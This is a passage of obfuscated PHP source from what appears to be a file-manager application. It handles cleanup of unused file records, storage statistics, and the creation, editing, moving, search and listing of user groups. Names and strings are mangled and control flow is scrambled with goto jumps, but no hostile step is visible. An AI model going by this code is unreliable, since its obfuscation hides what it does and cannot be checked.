$eâ¯‹šŞŠ¹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$e²÷¿áµâ‹ && !$BÀÑÓáß²¿) { return !1; } $eøÖôÍÂ® = array($eâ¯‹šŞŠ¹[1699] => $e²÷¿áµâ‹); if ($BÀÑÓáß²¿) { $eøÖôÍÂ® = array($eâ¯‹šŞŠ¹[1700] => $BÀÑÓáß²¿); } return $this->order($eâ¯‹šŞŠ¹[1703])->where($eøÖôÍÂ®)->find(); } public function clearEmpty($Dƒ¥£Ù†Œø = 0) { goto b‡ßâ½º²×; Eìù˜Á¡ã‡: $EÙô‰ÓÌ = $this->where($aˆ²ƒƒÉİã)->select(); if (!$EÙô‰ÓÌ) { return; } $dÃóÛÖ¼³½ = new Task($D§„¯ĞğÄç[1705], $D§„¯ĞğÄç[33], count($EÙô‰ÓÌ)); goto eƒ– ×ùçÀ; b‡ßâ½º²×: $D§„¯ĞğÄç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cƒÃªÒÕÍ¯ = time() - 3600 * 24 * $Dƒ¥£Ù†Œø; $aˆ²ƒƒÉİã = $D§„¯ĞğÄç[1704] . $cƒÃªÒÕÍ¯; goto Eìù˜Á¡ã‡; eƒ– ×ùçÀ: foreach ($EÙô‰ÓÌ as $c ‹‚Ëğß¬) { $dÃóÛÖ¼³½->update(1); $this->resetFile($c ‹‚Ëğß¬); } $dÃóÛÖ¼³½->end(); goto eÏ—Ñí‘º‚; eÏ—Ñí‘º‚: } public function resetFile($a¼¬ ”§¾) { goto E„¤ç¡µŠŞ; D²Ë—÷Ş‘¡: if ($a¼¬ ”§¾[$Bˆ†ñÈ¾ö°[1702]] != $E³šó®—‰Õ) { $this->where($D¤ä†­’Œƒ)->save(array($Bˆ†ñÈ¾ö°[1698] => $E³šó®—‰Õ)); } goto föíŒ¾Ê©ù; E„¤ç¡µŠŞ: $Bˆ†ñÈ¾ö° =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D¤ä†­’Œƒ = array($Bˆ†ñÈ¾ö°[437] => $a¼¬ ”§¾[$Bˆ†ñÈ¾ö°[436]]); $FÛëÛŠÌÀ = Model($Bˆ†ñÈ¾ö°[1154])->where($D¤ä†­’Œƒ)->count(); goto EŒˆïİå›ù; EŒˆïİå›ù: $aÀá¼³î“˜ = Model($Bˆ†ñÈ¾ö°[1706])->where($D¤ä†­’Œƒ)->count(); $E³šó®—‰Õ = intval($FÛëÛŠÌÀ) + intval($aÀá¼³î“˜); if ($E³šó®—‰Õ == 0) { IO::remove($a¼¬ ”§¾[$Bˆ†ñÈ¾ö°[75]]); $this->where($D¤ä†­’Œƒ)->delete(); $this->metaSet($a¼¬ ”§¾[$Bˆ†ñÈ¾ö°[436]], null, null); return; } goto D²Ë—÷Ş‘¡; föíŒ¾Ê©ù: } public function storageInfo($A©ĞÚ·Öíõ = false) { goto Aİº¥µë¨ì; Aİº¥µë¨ì: $f•…Çª™ä‹ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $C›êÔ£Û  = $this->count() + 0.0; $b‚Ã¶¯„Âœ = 0; goto f¤¾®…‰ãŸ; f¤¾®…‰ãŸ: $bó²’ÓŠ­¹ = 1; $d‡‚çŒÚ = 0; $c°îáóõå¶ = 5000; goto E…”†’ß‚; E…”†’ß‚: for ($DÆ§ªíÔ‚Ñ = 0; $DÆ§ªíÔ‚Ñ < $C›êÔ£Û ; $DÆ§ªíÔ‚Ñ = $DÆ§ªíÔ‚Ñ + $c°îáóõå¶) { $dêÈÏê°µö = $this->limit($DÆ§ªíÔ‚Ñ, $DÆ§ªíÔ‚Ñ + $c°îáóõå¶)->select(); foreach ($dêÈÏê°µö as $f¦ªÈ‚à¦) { $bó²’ÓŠ­¹ += $f¦ªÈ‚à¦[$f•…Çª™ä‹[77]] * $f¦ªÈ‚à¦[$f•…Çª™ä‹[1702]]; $b‚Ã¶¯„Âœ += $f¦ªÈ‚à¦[$f•…Çª™ä‹[77]] * ($f¦ªÈ‚à¦[$f•…Çª™ä‹[1702]] - 1); $d‡‚çŒÚ += $f¦ªÈ‚à¦[$f•…Çª™ä‹[1702]]; } } $b¼ ÍôŞ„ = array($f•…Çª™ä‹[1707] => $bó²’ÓŠ­¹, $f•…Çª™ä‹[1708] => $b‚Ã¶¯„Âœ, $f•…Çª™ä‹[1709] => $b‚Ã¶¯„Âœ / $bó²’ÓŠ­¹, $f•…Çª™ä‹[81] => $C›êÔ£Û , $f•…Çª™ä‹[1710] => $d‡‚çŒÚ); return $b¼ ÍôŞ„; goto a¯¯Ş‰óâË; a¯¯Ş‰óâË: } } class GroupModel extends ModelBase { protected $tableName = "\147\x72\x6f\x75\x70"; protected $tableMeta = array("\x74\x61\142\154\x65\x4e\x61\x6d\x65" => "\x67\162\x6f\165\x70\137\155\x65\x74\141", "\155\145\x74\141\x46\151\145\x6c\x64" => "\x67\162\x6f\x75\160\x49\x44"); protected function cacheFunctionAlias($b¿êÁ‡¤õ) { $e®Œç¸ºí =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; return array($e®Œç¸ºí[1711] => array($b¿êÁ‡¤õ[0], $e®Œç¸ºí[1712]), $e®Œç¸ºí[1713] => array($b¿êÁ‡¤õ[0], $e®Œç¸ºí[1712])); } protected function getInfo($aºõ—¯™öÅ) { $EÂëˆÖŒ¥” = $this->getInfoSimple($aºõ—¯™öÅ); if (!$EÂëˆÖŒ¥”) { return !1; } return $this->_listDataApplyItem($EÂëˆÖŒ¥”); } protected function getInfoSimple($eİÖíŠÈ•, $fåŒ­áÅóĞ = false) { $Bî¯¢–‡Á =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if ($fåŒ­áÅóĞ) { $FÀÅ¶­Ãõ = array($Bî¯¢–‡Á[1638] => intval($eİÖíŠÈ•)); $Dß÷ßìĞø = $this->where($FÀÅ¶­Ãõ)->find(); return is_array($Dß÷ßìĞø) ? $Dß÷ßìĞø : array(); } return $this->cacheFunctionGet($Bî¯¢–‡Á[1714], $eİÖíŠÈ•); } protected function groupAdd($d”¤Ÿ¸ÇÑÆ) { goto a¶¶É»ëñ–; fâµÇ›ƒ”‹: if ($b ’Õ ˜Ùï[$bÂ®Íñ±¬Õ[477]]) { $Dë ãĞˆÊõ = $b ’Õ ˜Ùï[$bÂ®Íñ±¬Õ[477]] . $b ’Õ ˜Ùï[$bÂ®Íñ±¬Õ[1638]] . $bÂ®Íñ±¬Õ[47]; } $CÚ‘Áôíˆä = array($bÂ®Íñ±¬Õ[404] => $this->groupNameAuto($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[479]], $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[28]]), $bÂ®Íñ±¬Õ[386] => $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[479]], $bÂ®Íñ±¬Õ[542] => $Dë ãĞˆÊõ, $bÂ®Íñ±¬Õ[1715] => $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1622]], $bÂ®Íñ±¬Õ[1716] => 0, $bÂ®Íñ±¬Õ[1642] => 0); if (isset($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1661]])) { $CÚ‘Áôíˆä[$bÂ®Íñ±¬Õ[1661]] = $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1661]]; } else { $fµ×”ê§–É = $this->max($bÂ®Íñ±¬Õ[1661]); if (!$fµ×”ê§–É) { $fµ×”ê§–É = 0; } $CÚ‘Áôíˆä[$bÂ®Íñ±¬Õ[1661]] = $fµ×”ê§–É + 1; } goto dŞâ—‡Ùãä; a¶¶É»ëñ–: $bÂ®Íñ±¬Õ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[479]] && isset($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1638]]) && $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1638]] == 1) { if ($b ’Õ ˜Ùï = $this->getInfoSimple($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1638]], !0)) { return $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1638]]; } } else { $b ’Õ ˜Ùï = $this->getInfoSimple($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[479]]); if (!$b ’Õ ˜Ùï) { return !1; } } $Dë ãĞˆÊõ = $bÂ®Íñ±¬Õ[488]; goto fâµÇ›ƒ”‹; bÄ¯‚‹éäÁ: if (isset($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1717]])) { $this->metaSet($d¼Øª†ÀÏİ, array($bÂ®Íñ±¬Õ[1717] => $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1717]], $bÂ®Íñ±¬Õ[1718] => $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1718]])); unset($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1717]]); unset($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1718]]); } Model($bÂ®Íñ±¬Õ[1154])->groupRootAdd($d¼Øª†ÀÏİ); return $d¼Øª†ÀÏİ; goto FÂìßù‡´—; dŞâ—‡Ùãä: if (!empty($d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1638]])) { $CÚ‘Áôíˆä[$bÂ®Íñ±¬Õ[1638]] = $d”¤Ÿ¸ÇÑÆ[$bÂ®Íñ±¬Õ[1638]]; } $d¼Øª†ÀÏİ = $this->add($CÚ‘Áôíˆä); $this->setNamePinyin($d¼Øª†ÀÏİ, $CÚ‘Áôíˆä[$bÂ®Íñ±¬Õ[28]]); goto bÄ¯‚‹éäÁ; FÂìßù‡´—: } protected function groupEdit($E©‡Â…ä¾°, $C—¯İ£†—) { $DÜîñš¬ò =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!empty($C—¯İ£†—[$DÜîñš¬ò[479]])) { $F“Âô ‹ = $this->getInfoSimple($E©‡Â…ä¾°); $fÅÏŒï÷ª = $this->getInfoSimple($C—¯İ£†—[$DÜîñš¬ò[479]]); if (!$F“Âô ‹ || !$fÅÏŒï÷ª) { return !1; } if ($F“Âô ‹[$DÜîñš¬ò[1638]] == $fÅÏŒï÷ª[$DÜîñš¬ò[1638]]) { return !1; } if ($C—¯İ£†—[$DÜîñš¬ò[479]] != $F“Âô ‹[$DÜîñš¬ò[479]]) { if ($fÅÏŒï÷ª[$DÜîñš¬ò[477]] !== $F“Âô ‹[$DÜîñš¬ò[477]] && strpos($fÅÏŒï÷ª[$DÜîñš¬ò[477]], $F“Âô ‹[$DÜîñš¬ò[477]] . $F“Âô ‹[$DÜîñš¬ò[1638]] . $DÜîñš¬ò[47]) === 0) { return !1; } $C—¯İ£†—[$DÜîñš¬ò[542]] = $fÅÏŒï÷ª[$DÜîñš¬ò[477]] . $C—¯İ£†—[$DÜîñš¬ò[479]] . $DÜîñš¬ò[47]; $this->_changeChildLevel($F“Âô ‹, $fÅÏŒï÷ª); } } if (isset($C—¯İ£†—[$DÜîñš¬ò[28]])) { $this->setNamePinyin($E©‡Â…ä¾°, $C—¯İ£†—[$DÜîñš¬ò[28]]); } if (isset($C—¯İ£†—[$DÜîñš¬ò[1717]])) { $this->metaSet($E©‡Â…ä¾°, array($DÜîñš¬ò[1717] => $C—¯İ£†—[$DÜîñš¬ò[1717]], $DÜîñš¬ò[1718] => $C—¯İ£†—[$DÜîñš¬ò[1718]])); unset($C—¯İ£†—[$DÜîñš¬ò[1717]]); unset($C—¯İ£†—[$DÜîñš¬ò[1718]]); } return $this->where(array($DÜîñš¬ò[1719] => $E©‡Â…ä¾°))->save($C—¯İ£†—); } private function _changeChildLevel($AÈåˆÀ‰í, $EãÑ´ÌŞù, $bÅ†ßõÔ‹Â = false) { goto AµÊƒ„‰”Ò; AµÊƒ„‰”Ò: $C·¦Ê’© =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $aÊŠÎ–©¾ = $AÈåˆÀ‰í[$C·¦Ê’©[477]] . $AÈåˆÀ‰í[$C·¦Ê’©[1638]] . $C·¦Ê’©[47]; $f±–µéÁà = $EãÑ´ÌŞù[$C·¦Ê’©[477]] . $EãÑ´ÌŞù[$C·¦Ê’©[1638]] . $C·¦Ê’©[47] . $AÈåˆÀ‰í[$C·¦Ê’©[1638]] . $C·¦Ê’©[47]; goto b¦×µ¡Ä¿; b¦×µ¡Ä¿: if ($bÅ†ßõÔ‹Â) { $f±–µéÁà = $EãÑ´ÌŞù[$C·¦Ê’©[477]] . $EãÑ´ÌŞù[$C·¦Ê’©[1638]] . $C·¦Ê’©[47]; } $cĞÓİöÂ‰ = array($C·¦Ê’©[542] => array($C·¦Ê’©[501], $AÈåˆÀ‰í[$C·¦Ê’©[477]] . $AÈåˆÀ‰í[$C·¦Ê’©[1638]] . $C·¦Ê’©[502])); $a…ÎŠ¶˜¿Õ = array($C·¦Ê’©[542] => array($C·¦Ê’©[550], "\x72\x65\x70\154\x61\x63\145\x28\x70\x61\x72\x65\156\x74\114\145\x76\145\154\54\x27{$aÊŠÎ–©¾}\47\x2c\47{$f±–µéÁà}\47\x29")); goto bŠãÓ²¯‘ó; bŠãÓ²¯‘ó: $this->where($cĞÓİöÂ‰)->data($a…ÎŠ¶˜¿Õ)->save(); goto Bğ·µ¼Ï‚; Bğ·µ¼Ï‚: } public function setNamePinyin($bÓšÛ²¸Œ, $eèëŞ‹³å = false) { $b·‡ÕÃÖçÆ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$eèëŞ‹³å) { $Aéµ¤Ÿ³œ½ = $this->getInfoSimple($bÓšÛ²¸Œ); $eèëŞ‹³å = $Aéµ¤Ÿ³œ½[$b·‡ÕÃÖçÆ[28]]; } if (!Input::check($eèëŞ‹³å, $b·‡ÕÃÖçÆ[545])) { $this->metaSet($bÓšÛ²¸Œ, $b·‡ÕÃÖçÆ[433], null); $this->metaSet($bÓšÛ²¸Œ, $b·‡ÕÃÖçÆ[432], null); return; } $D¿ŞÁö§” = array($b·‡ÕÃÖçÆ[433] => str_replace($b·‡ÕÃÖçÆ[50], $b·‡ÕÃÖçÆ[33], Pinyin::encode($eèëŞ‹³å)), $b·‡ÕÃÖçÆ[432] => Pinyin::encode($eèëŞ‹³å, $b·‡ÕÃÖçÆ[546])); $this->metaSet($bÓšÛ²¸Œ, $D¿ŞÁö§”); } protected function groupStatus($c»…®„Éœ½, $e¥øÂôõÂÓ) { goto e•æÙíé¹; A¥öÁù¬ÃÎ: foreach ($dÕĞïÒŸÌ as $c»…®„Éœ½) { $fëÃø ¦ÃÛ[] = array($cŞ‚‚øÚç[1638] => $c»…®„Éœ½, $cŞ‚‚øÚç[92] => $cŞ‚‚øÚç[683], $cŞ‚‚øÚç[368] => $e¥øÂôõÂÓ); } return Model($cŞ‚‚øÚç[1720])->addAll($fëÃø ¦ÃÛ, array(), !0); goto AİášİòŒ‡; e•æÙíé¹: $cŞ‚‚øÚç =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $B’á……ù‰å = $this->getInfoSimple($c»…®„Éœ½); if (!$B’á……ù‰å) { return !1; } goto bÆ¹æõÈ‘‹; bÆ¹æõÈ‘‹: if ($e¥øÂôõÂÓ == $cŞ‚‚øÚç[86]) { $dÕĞïÒŸÌ = $this->parentLevelArray($B’á……ù‰å[$cŞ‚‚øÚç[477]]); } else { $e¨©°ÅÔ’¥ = array($cŞ‚‚øÚç[542] => array($cŞ‚‚øÚç[501], $B’á……ù‰å[$cŞ‚‚øÚç[477]] . $B’á……ù‰å[$cŞ‚‚øÚç[1638]] . $cŞ‚‚øÚç[502])); $dÕĞïÒŸÌ = $this->where($e¨©°ÅÔ’¥)->field($cŞ‚‚øÚç[1638])->select(); $dÕĞïÒŸÌ = array_to_keyvalue($dÕĞïÒŸÌ, $cŞ‚‚øÚç[33], $cŞ‚‚øÚç[1638]); } $dÕĞïÒŸÌ[] = $B’á……ù‰å[$cŞ‚‚øÚç[1638]]; $fëÃø ¦ÃÛ = array(); goto A¥öÁù¬ÃÎ; AİášİòŒ‡: } protected function groupRemove($AÓ ©›„´î) { goto Cá¡é‹¬’§; Bˆ«º‘Ÿ¶´: Model($f„Ü¸¢Å‹ô[745])->groupRootRemove($AÓ ©›„´î); return $this->where($d…¢¢¨×Šõ)->delete(); goto d–ö„´„›ª; c ê™Œ‡: if (!$f™Ö…ˆ½¦Ğ || $f™Ö…ˆ½¦Ğ[$f„Ü¸¢Å‹ô[479]] == 0) { return !1; } $bÉ†ğ‰Öˆá = $this->getInfoSimple($f™Ö…ˆ½¦Ğ[$f„Ü¸¢Å‹ô[479]]); $this->_changeChildLevel($f™Ö…ˆ½¦Ğ, $bÉ†ğ‰Öˆá, !0); goto E”ºæ«Øñé; E”ºæ«Øñé: $this->where(array($f„Ü¸¢Å‹ô[479] => $AÓ ©›„´î))->save(array($f„Ü¸¢Å‹ô[479] => $f™Ö…ˆ½¦Ğ[$f„Ü¸¢Å‹ô[479]])); Model($f„Ü¸¢Å‹ô[1720])->where($d…¢¢¨×Šõ)->delete(); Model($f„Ü¸¢Å‹ô[1721])->where($d…¢¢¨×Šõ)->delete(); goto Bˆ«º‘Ÿ¶´; Cá¡é‹¬’§: $f„Ü¸¢Å‹ô =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $d…¢¢¨×Šõ = array($f„Ü¸¢Å‹ô[1638] => $AÓ ©›„´î); $f™Ö…ˆ½¦Ğ = $this->where($d…¢¢¨×Šõ)->find(); goto c ê™Œ‡; d–ö„´„›ª: } protected function groupSort($F½›½˜İŸ) { $a—¢Üœ·Æ‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $cÖ¥¿³ = array(); foreach ($F½›½˜İŸ as $A•¨‰õÅì => $Aİƒ†óµÙŸ) { $cÖ¥¿³[] = array($a—¢Üœ·Æ‘[1638], $Aİƒ†óµÙŸ, $a—¢Üœ·Æ‘[1661], $A•¨‰õÅì + 1); } $this->saveAll($cÖ¥¿³); } public function listData() { $E”Ì‡Ô‡â‹ = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E”Ì‡Ô‡â‹[$_SERVER[ó¬â¥‰ÊÔ¤Ç£][363]]); return $E”Ì‡Ô‡â‹; } private function _makeOrder($aÖœíŠ³¨ = '') { goto Fí»æÂƒ†; Bšµ³‚‘—Å: $aÖœíŠ³¨ = $aÖœíŠ³¨ . "{$fù¸“É°Ú}\40{$A´‹ÆÉËÚ³}\x2c\x20\x67\x72\157\165\x70\x49\x44\x20\x61\163\143"; return $this->order($aÖœíŠ³¨); goto C¹…ºî´÷†; Cò” ÍÉˆõ: $fù¸“É°Ú = Input::get($dŒÄõÀÏ¼À[424], $dŒÄõÀÏ¼À[7], $dŒÄõÀÏ¼À[1642], $A‰‡¯‘Üİ‘); $A´‹ÆÉËÚ³ = Input::get($dŒÄõÀÏ¼À[425], $dŒÄõÀÏ¼À[7], $dŒÄõÀÏ¼À[1722], array($dŒÄõÀÏ¼À[1722], $dŒÄõÀÏ¼À[421])); $A´‹ÆÉËÚ³ = $Fï¹ÌÈŸÍ[$A´‹ÆÉËÚ³]; goto Bšµ³‚‘—Å; Fí»æÂƒ†: $dŒÄõÀÏ¼À =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $A‰‡¯‘Üİ‘ = array($dŒÄõÀÏ¼À[1638], $dŒÄõÀÏ¼À[28], $dŒÄõÀÏ¼À[1624], $dŒÄõÀÏ¼À[192]); $Fï¹ÌÈŸÍ = array($dŒÄõÀÏ¼À[419] => $dŒÄõÀÏ¼À[420], $dŒÄõÀÏ¼À[421] => $dŒÄõÀÏ¼À[422]); goto Cò” ÍÉˆõ; C¹…ºî´÷†: } public function listChild($F”Õ°îõº) { $Dò‚òåËæ‘ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $c®ÅàËË¨ò = $this->where(array($Dò‚òåËæ‘[479] => $F”Õ°îõº))->_makeOrder()->selectPage(200); $this->_listDataApply($c®ÅàËË¨ò[$Dò‚òåËæ‘[363]]); return $c®ÅàËË¨ò; } public function listByID($EÏ”“×ğÁ) { $f¸—ÁÀ³ÔÛ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$EÏ”“×ğÁ) { return array(); } $Eõ÷Ï·„š = array($f¸—ÁÀ³ÔÛ[1638] => array($f¸—ÁÀ³ÔÛ[7], $EÏ”“×ğÁ)); $Bî÷íµ˜¤é = $this->where($Eõ÷Ï·„š)->select(); $this->_listDataApply($Bî÷íµ˜¤é); return $Bî÷íµ˜¤é; } public function listSearch($fœàË™õ…Ä) { goto AĞ¥”å¹Å; f“°ßò±Ÿ: if (!trim($fÍĞğÏôÂí)) { return !1; } $fÍĞğÏôÂí = str_replace($F°–ƒ†“ä[1725], $F°–ƒ†“ä[1726], $fÍĞğÏôÂí); $D‘¼Î¶Åå£ = array($F°–ƒ†“ä[1638] => array($F°–ƒ†“ä[375], "{$fÍĞğÏôÂí}\45"), $F°–ƒ†“ä[28] => array($F°–ƒ†“ä[375], "\45{$fÍĞğÏôÂí}\x25"), $F°–ƒ†“ä[909] => $F°–ƒ†“ä[1727]); goto e‘˜¸âÒ ‚; aé¹À¼Æä: return $d‘ò¿æ¤Š; goto Aêğ‰„ÎÈ; Eåà¶÷§³š: $d‘ò¿æ¤Š = $d‘ò¿æ¤Š ? $d‘ò¿æ¤Š : array(); if (!$d‘ò¿æ¤Š || count($d‘ò¿æ¤Š[$F°–ƒ†“ä[363]]) < 5 && Input::check($fÍĞğÏôÂí, $F°–ƒ†“ä[314])) { goto B÷ˆŒÍÇïÑ; FÍõ»ÙÜ©Æ: $DíÛ‚…ùÃÏ = array_merge($añ×³¾­ğÈ, $DİÛ±¶°ÓŞ, $d‘ò¿æ¤Š[$F°–ƒ†“ä[363]]); $d‘ò¿æ¤Š[$F°–ƒ†“ä[363]] = array_unique_by_key($DíÛ‚…ùÃÏ, $F°–ƒ†“ä[1638]); $d‘ò¿æ¤Š[$F°–ƒ†“ä[360]][$F°–ƒ†“ä[361]] = count($d‘ò¿æ¤Š[$F°–ƒ†“ä[363]]); goto c‹ŠÈÊ¬ñ; c‹ŠÈÊ¬ñ: $d‘ò¿æ¤Š[$F°–ƒ†“ä[360]][$F°–ƒ†“ä[362]] = ceil($d‘ò¿æ¤Š[$F°–ƒ†“ä[360]][$F°–ƒ†“ä[361]] / $d‘ò¿æ¤Š[$F°–ƒ†“ä[360]][$F°–ƒ†“ä[358]]); goto C‘“…„”•; B÷ˆŒÍÇïÑ: $F¦æ’İñ„ = $this->groupChildrenAll($a—´»Âéå­); $añ×³¾­ğÈ = $this->_searchFromMeta($F°–ƒ†“ä[432], $fÍĞğÏôÂí, 10, $F¦æ’İñ„); $DİÛ±¶°ÓŞ = $this->_searchFromMeta($F°–ƒ†“ä[433], $fÍĞğÏôÂí, 10, $F¦æ’İñ„); goto FÍõ»ÙÜ©Æ; C‘“…„”•: } $this->_listDataApply($d‘ò¿æ¤Š[$F°–ƒ†“ä[363]]); goto aé¹À¼Æä; e‘˜¸âÒ ‚: if ($a—´»Âéå­) { $bõá´™”î = $this->getInfoSimple($a—´»Âéå­); $fÆÛäî¸éí = $bõá´™”î[$F°–ƒ†“ä[477]] . $a—´»Âéå­ . $F°–ƒ†“ä[502]; $D‘¼Î¶Åå£ = array($D‘¼Î¶Åå£, array($F°–ƒ†“ä[477] => array($F°–ƒ†“ä[375], $fÆÛäî¸éí))); } $D‘¼Î¶Åå£ = $this->parseWhereLike($D‘¼Î¶Åå£); $d‘ò¿æ¤Š = $this->_makeOrder()->where($D‘¼Î¶Åå£)->selectPage(20); goto Eåà¶÷§³š; AĞ¥”å¹Å: $F°–ƒ†“ä =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $fÍĞğÏôÂí = $fœàË™õ…Ä[$F°–ƒ†“ä[1723]]; $a—´»Âéå­ = isset($fœàË™õ…Ä[$F°–ƒ†“ä[1724]]) ? $fœàË™õ…Ä[$F°–ƒ†“ä[1724]] : !1; goto f“°ßò±Ÿ; Aêğ‰„ÎÈ: } protected function groupChildrenAll($Bò½½í¼†Ÿ) { $AÖ“…‘ÓÖÈ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Bò½½í¼†Ÿ) { return !1; } if (is_string($Bò½½í¼†Ÿ)) { $Bò½½í¼†Ÿ = array($Bò½½í¼†Ÿ); } $Cé˜Ÿ„ó = $Bò½½í¼†Ÿ; foreach ($Bò½½í¼†Ÿ as $C¶»ÉÁ•ê) { $A†ó˜åà¯ç = $this->getInfoSimple($C¶»ÉÁ•ê); $c²À›©ºŠÅ = array($AÖ“…‘ÓÖÈ[477] => array($AÖ“…‘ÓÖÈ[375], $A†ó˜åà¯ç[$AÖ“…‘ÓÖÈ[477]] . $C¶»ÉÁ•ê . $AÖ“…‘ÓÖÈ[502])); $b¿Ê‰îÕ«Ÿ = $this->field($AÖ“…‘ÓÖÈ[1638])->where($c²À›©ºŠÅ)->select(); $Cé˜Ÿ„ó = array_merge($Cé˜Ÿ„ó, array_to_keyvalue($b¿Ê‰îÕ«Ÿ, $AÖ“…‘ÓÖÈ[33], $AÖ“…‘ÓÖÈ[1638])); } return array_unique($Cé˜Ÿ„ó); } private function _searchFromMeta($DÌñ‡ì¸, $a¡Ê‹¸÷, $fôĞ³ùøôœ, $dÍˆ½êŠ¬©) { goto dÚç²ƒæƒ; A¨ğ¿‹¬©: $cÒÜğ›İÑÀ = $this->parseWhereLike($cÒÜğ›İÑÀ); if ($dÍˆ½êŠ¬©) { $cÒÜğ›İÑÀ[$C³²àŸ«¼Ü[1638]] = array($C³²àŸ«¼Ü[7], $dÍˆ½êŠ¬©); } $CõÒÓñ‹ç = Model($C³²àŸ«¼Ü[1728])->where($cÒÜğ›İÑÀ)->limit($fôĞ³ùøôœ)->select(); goto aà …ÅŠ¢Ò; aà …ÅŠ¢Ò: if (!$CõÒÓñ‹ç) { return array(); } $CõÒÓñ‹ç = array_to_keyvalue($CõÒÓñ‹ç, $C³²àŸ«¼Ü[33], $C³²àŸ«¼Ü[1638]); $F„Ö£æç™ = $this->where(array($C³²àŸ«¼Ü[1719] => array($C³²àŸ«¼Ü[7], $CõÒÓñ‹ç)))->select(); goto D´´šåóˆŞ; dÚç²ƒæƒ: $C³²àŸ«¼Ü =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $a¡Ê‹¸÷ = strtolower($a¡Ê‹¸÷); $cÒÜğ›İÑÀ = array($C³²àŸ«¼Ü[92] => $DÌñ‡ì¸, $C³²àŸ«¼Ü[368] => array($C³²àŸ«¼Ü[375], "\45{$a¡Ê‹¸÷}\x25")); goto A¨ğ¿‹¬©; D´´šåóˆŞ: if (!$F„Ö£æç™) { return array(); } return $F„Ö£æç™; goto e»Êõ°á¹š; e»Êõ°á¹š: } protected function _listDataApplyItem($C‹ã¼ ­‚Ø) { $bÈÀ±¾ä·” = array($C‹ã¼ ­‚Ø); $this->_listDataApply($bÈÀ±¾ä·”); return $bÈÀ±¾ä·”[0]; } protected function _listDataApply(&$Eºß’ŠÏ›Ù) { goto aÙèæÙè‡¼; C‰¨âÄ†‹—: $this->_listAppendChildren($Eºß’ŠÏ›Ù); $this->_listAppendChildrenMember($Eºß’ŠÏ›Ù); $this->_listAppendMeta($Eºß’ŠÏ›Ù, $C„Òè’×); goto Dè—ÄùÔÇŸ; aÙèæÙè‡¼: $bæ´í£ÑÅŸ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; if (!$Eºß’ŠÏ›Ù) { return; } $C„Òè’× = array_to_keyvalue($Eºß’ŠÏ›Ù, $bæ´í£ÑÅŸ[33], $bæ´í£ÑÅŸ[1638]); goto C‰¨âÄ†‹—; Dè—ÄùÔÇŸ: $this->_listAppendParent($Eºß’ŠÏ›Ù); $this->_listAppendSourceRoot($Eºß’ŠÏ›Ù, $C„Òè’×); goto DÍ·Ş‚è—; DÍ·Ş‚è—: } private function _listAppendChildren(&$Fê¦•À¸î) { goto f°”é£”ö; FŞÍç‚ºÂ§: $D—øÛõÊ™¼ = array_to_keyvalue($D—øÛõÊ™¼, $d×Ğ…¦äÂ[468]); foreach ($Fê¦•À¸î as &$b–°¯Ø‡ª) { $b–°¯Ø‡ª[$d×Ğ…¦äÂ[1729]] = isset($D—øÛõÊ™¼[$b–°¯Ø‡ª[$d×Ğ…¦äÂ[1638]] . $d×Ğ…¦äÂ[1730]]); } unset($b–°¯Ø‡ª); goto fõĞ’Öšã; f°”é£”ö: $d×Ğ…¦äÂ =& $_SERVER[ó¬â¥‰ÊÔ¤Ç£]; $D•êÍ’ª“± = $d×Ğ…¦äÂ[370]; $D—øÛõÊ™¼ = array(); goto F³¬‰¬ƒÔƒ; F³¬‰¬ƒÔƒ: $Aµğï÷‹Ü = count($Fê¦•À¸î); $AÌ½Æê¤ = $this->tablePrefix . $this->tableName; for ($c¸¡Ú¼…ŒÔ = 0, $e¿Ó‚³¥«† = 0; $c¸¡Ú¼…ŒÔ < $Aµğï÷‹Ü; $c¸¡Ú¼…ŒÔ++) { $e¿Ó‚³¥«†++; $e‡²ñêœ…š = $Fê¦•À¸î[$c¸¡Ú¼…ŒÔ][$d×Ğ…¦äÂ[1638]]; $D•êÍ’ª“± .= 